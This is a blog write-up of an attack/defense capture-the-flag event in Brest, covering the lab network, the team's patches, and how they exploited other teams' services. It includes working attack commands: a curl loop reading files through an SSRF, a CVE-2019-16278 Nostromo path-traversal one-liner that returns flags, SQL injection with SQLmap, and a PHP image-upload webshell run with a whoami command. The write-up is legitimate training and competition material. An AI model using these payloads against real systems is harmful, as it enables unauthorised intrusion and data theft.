---
layout: post
title: UYBHYS - Sea Monster Attack & Defense CTF
---

Last week-end I teamed up with members from [Aperikube](https://www.aperikube.fr) for an Attack/Defense CTF which took place in Brest - France. In this "small" blog post I will write about this experience, the challenges and our methodology :)

![Banner]({{ site.baseurl }}/images/SeaMonsterBanner.png "Banner"){: .center-image }

<!--more-->

Rules & informations about the CTF are available in the following PDF : [CTF_UYBHYS.pdf]({{ site.baseurl }}/files/CTF_UYBHYS.pdf)

## CTF Architecture

All teams had the same virtual machines to secure and attack.

- bastion.unlock.ctf : 172.16.1.20
- www.unlock.ctf : 172.16.1.10
- plc.unlock.ctf : 192.168.12.10
- win.unlock.ctf : 192.168.0.10
- fw.unlock.ctf (PfSense)

These machines host some services such as Web Servers, RDP etc... We had access to the source code of the binaries and the URL alive.unlock.ctf displayed the status of all teams services. In the following picture you can clearly see Team08 and Team10 didn't patch their RDP.

![Alive]({{ site.baseurl }}/images/SeaMonsterAlive.png "Alive services"){: .center-image }

In the first 30 minutes we could access our machines and secure them without losing any points, then the scoreboard will update every 20 seconds to decrease your point if a service is down, you also loose point when a team is stealing one of your flag. Based on what we had we mapped the services linked to a flag and 2 columns to check if they were patched and/or exploited.

{% highlight sql %}
PORT      STATE    SERVICE       REASON         VERSION                             PATCHED     EXPLOIT
53                               Bastion        bind                                OK          OK       SSRF/zone
25/tcp                           PLC            vplc ESMTP Postfix (Debian/GNU)     OK     
80/tcp    open     http          Web            nginx 1.6.2                         OK          OK       sql    TODO RCE
502/tcp   open     modbus        PLC            Modbus TCP                          OK          OK       Modbus    
3232/tcp  open     http          Web            nostromo 1.9.6                      OK          OK       DirTravRCE        
3389/tcp  filtered ms-wbt-server Win                                                     
4141/tcp  open     oirtgsvc?     Bastion        whoareyou                           OK                   BOF ? 
4242                             Bastion                                            OK              
8080/tcp  open     http          Bastion        Apache httpd 2.4.10 ((Debian))      OK          KO       MySQL ?
9090/tcp  open     http          Web            nginx 1.6.2                         OK          OK       LDAP inj
45454/tcp open     unknown       Bastion        exploit 
{% endhighlight %}  


It was possible to trade some points for hints and insights in the Black Market, however nothing is guaranted: flags and hints might be wrong or misleading. We took the $0 trade, this gave us a list of the teams and their corresponding sea monster : 

{% highlight sql %}
TEAM1-CRABAL
TEAM2-MEDUSA
TEAM3-STARKA
TEAM4-PIKOR
TEAM5-PONIK
TEAM6-BALENOR
TEAM7-KRAKEN
TEAM8-SQUIDO
TEAM9-HYDROL
TEAM10-SHARKY
TEAM11-POULPY
TEAM12-GUMPAL
TEAM12-SNAKUS
TEAM14-MORSOS
TEAM15-RAYMOL
{% endhighlight %}


## win.unlock.ctf

I wasn't paying attention when the organizers told us the account was not `user` as stated in the PDF but in fact `Administrator`. Missing this information, made me try to exploit the machine in order to get an NT AUTORITY SYSTEM shell, I went to the easy path `Eternal Blue`.

![Windows Eternal Blue]({{ site.baseurl }}/images/SeaMonsterWin.png "Windows Eternal Blue"){: .center-image }

### RDP - 3389

However the SMB service was not forwarded by the firewall and we couldn't exploit the service, it seems the intended way was to use `Bluekeep` as the RDP was checked by the bot and the team lose some points until we opened a Port Forward rule.

![Firewall]({{ site.baseurl }}/images/SeaMonsterFirewall.png "Firewall services"){: .center-image }


## plc.unlock.ctf 

### Modbus - 502

This machine was an easy win, we used [plcscan](https://github.com/meeas/plcscan) to scan the Modbus service on port 502, the PLC description contained the flag.

![Modbus]({{ site.baseurl }}/images/SeaMonsterModbusScan.png "Modbus services"){: .center-image }

![PLC]({{ site.baseurl }}/images/SeaMonsterPLC.png "PLC description"){: .center-image }

{% highlight sql %}
team02.ctf:502 Modbus/TCP
  Unit ID: 0
    Device: diateam diateam virtual plc v42.1337 UYB{bda1c2b26927c2ac87e084fc5} 
  Unit ID: 255
    Device: diateam diateam virtual plc v42.1337 UYB{bda1c2b26927c2ac87e084fc5} 
team03.ctf:502 Modbus/TCP
  Unit ID: 0
    Device: diateam diateam virtual plc v42.1337 UYB{7ec413a0d19bf0a59a95d8874} 
  Unit ID: 255
    Device: diateam diateam virtual plc v42.1337 UYB{7ec413a0d19bf0a59a95d8874} 
[...]
team14.ctf:502 Modbus/TCP
  Unit ID: 0
    Device: diateam diateam virtual plc v42.1337 UYB{3e710c7179074e1a62be9de88} 
  Unit ID: 255
    Device: diateam diateam virtual plc v42.1337 UYB{3e710c7179074e1a62be9de88} 
{% endhighlight %}

## bastion.unlock.ctf

### SSRF - Port 8080

The web server on port 8080 allows the user to ping a machine, we runned the `grep` binary on the entire disk to find files containing flags and used the SSRF to display them with `http://team14.ctf:8080/index.php?ip=file://PATH_TO_FILE`.

It appears we could read the file `file:///etc/bind/zones/unlock.ctf.db`, so we scripted the exploitation of this challenge, however this was the flag for the `Port 53`...

{% highlight bash %}
for i in `seq 1 15`; do echo "Team"$i; curl -s http://team0$i.ctf:8080/index.php?ip=file%3A%2F%2F%2Fetc%2Fbind%2Fzones%2Funlock.ctf.db | grep UYB; done
{% endhighlight %}

![Bind]({{ site.baseurl }}/images/SeaMonsterWWWssrfpath.png "Bind"){: .center-image }

We made the mistake to assume a simple filter like `$ip[0] == "1"` would be enough to stop any exploitation on our machine, however we missed the critical point. Another service was available on port 6666, which would display the content of the file using a specificly crafted URL. We saw the exploit in our logs and replayed the URL on the other team to get more flags.

## www.unlock.ctf 

### Nostromo - Port 3232

We used the CVE-2019-16278 to exploit the Nostromo service on the web machine.

{% highlight bash %}
$ for i in `seq 1 15`; do echo -n "Team"$i; curl -s "http://team0$i.ctf:3232//.%0D./.%0D./.%0D./.%0D./var/nostromo/conf/flag.txt" | grep UYB; done

[...]
Team2 UYB{bcf13245517c9fb5158719cec}
Team3 UYB{b454ae20caa9b07ab4e2c3c01}
Team4 UYB{41c0136228d5a7db614f89431}
[...]
{% endhighlight %}

Our patch might have been the worst of all patch history, we made a copy a the current index page with `curl` and then replaced the nostromo service with a `python -m SimpleHTTPServer 3232`. Dirty but efficient !

![Trade]({{ site.baseurl }}/images/SeaMonsterTrade.jpg "Trade"){: .center-image }

### Custom website - Port 80 

First part of the exploitation was to create an account to access the website and find the SQL injection. The exploitation doesn't need to be logged in, the flag was stored as a plaintext password for the administrator. `SQLmap` and simple `for` loop were enough to exploit the vulnerability and dump the users table.

![SQL]({{ site.baseurl }}/images/SeaMonsterSQL.png "SQL"){: .center-image }

The website contains multiple vulnerabilities, once logged as admin we can access the upload page, even though the HTML upload part was commented. 

![UPLOAD]({{ site.baseurl }}/images/SeaMonsterWWWuploadcode.png "upload"){: .center-image }

The PHP backend is doing some checks but it is not enough to prevent the upload of a PHP file in the images directory, we used a payload from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Picture%20Metadata/PHP_exif_system.jpg) and then executed our commands with `http://team12.ctf/images_import/PHP_exif_system.php?c=whoami`. Unfortunately the CTF ended when we got our command exec... (otherwise we might have been able to exploit EternalBlue against the Windows machine and grab the flag located in C:\flag).

Even if you had patched these vulnerabilities in the website, there were two backup folders `site.bak` and `site_save` to remove.

![Backup]({{ site.baseurl }}/images/SeaMonsterWWWtree.png "Backup"){: .center-image }

## Final Thought

The CTF was great, the infrastructure worked flawlessly and the challenge difficulty was balanced enough to let the team understand, patch and exploit them during the 5 hours timeframe. We finished 1st but I would like to thank all the teams for their fair-play and the organisers for the event. Also thank you to the different sponsors ;)

![Scoreboard]({{ site.baseurl }}/images/SeaMonsterScoreboard.jpg "Scoreboard"){: .center-image }
